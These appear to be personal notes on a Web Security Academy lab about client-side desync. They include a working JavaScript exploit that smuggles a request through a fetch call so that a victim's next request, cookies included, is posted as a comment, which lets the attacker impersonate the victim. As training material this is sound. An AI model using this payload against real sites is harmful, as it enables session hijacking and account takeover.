# EXPERT: Client-side desync

As always, Jarno with this excellent explanation:

[https://www.youtube.com/watch?v=QapdENfSXzE&t=15s](https://www.youtube.com/watch?v=QapdENfSXzE&t=15s)

Client side desync happens when the endpoint ONLY supports HTTP 1.1 and ignores the Content-Length completely (with body methods allowed)

![Снимок экрана 2025-12-02 в 11.18.38.png](EXPERT%20Client-side%20desync/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-02_%D0%B2_11.18.38.png)

NOTE: For the below exploit, you’ll need to adjust Content-Length in `sr` :

```jsx
<script>
sr = ['POST /en/post/comment HTTP/1.1',
    'Host: 0a2400ac038078d881bb1b0300d70076.h1-web-security-academy.net',
    'Cookie: session=lBAPINcvX1qExWQPjsO5Kx9MH1KhSp9L; _lab_analytics=tDMpnFlrWOCT2NUjhDNnIfdMU3IVcjWX0DAGemduyw1X4vh40T8cXc9L8WmuoYAno9ToW6Sx0ETG0TdcHzfeVS4VBxHWorwUOP0Cr5MOrs7OabCJqNJzSEGLueRXPnQ5AY4MzOBLFrHJu48hVt4FGYrmAPZqFBHC6t3wdw8IAQmSSp25kkWjFlXJwX1ZJulcVD8L5QmJVTDayX5d2MfU9YkLuqynzCJfjbFP7dReg2NB4SjQKYpTx2fSi0tcLKSN',
    'Content-Length: 790',
    'Content-Type: x-www-form-urlencoded',
    'Connection: keep-alive',
    '\r\ncsrf=1nrF9by5mb7LmHCShZQJHIbmjGO81PUx&postId=1&name=123&email=foo@bar&website=http://abc.com&comment=fromvictim']
    .join('\r\n')

fetch('https://0a2400ac038078d881bb1b0300d70076.h1-web-security-academy.net', {
        method: 'POST',
        body: sr,
        mode: 'cors',
        credentials: 'include',
    }).catch(() => {
        fetch('https://0a2400ac038078d881bb1b0300d70076.h1-web-security-academy.net/capture-me', {
        mode: 'no-cors',
        credentials: 'include'
    })
})
</script>
```

After adjusting the length and delivering to victim:

![Снимок экрана 2025-12-02 в 11.58.01.png](EXPERT%20Client-side%20desync/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-02_%D0%B2_11.58.01.png)

Impersonate victim:

![Снимок экрана 2025-12-02 в 11.58.31.png](EXPERT%20Client-side%20desync/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-02_%D0%B2_11.58.31.png)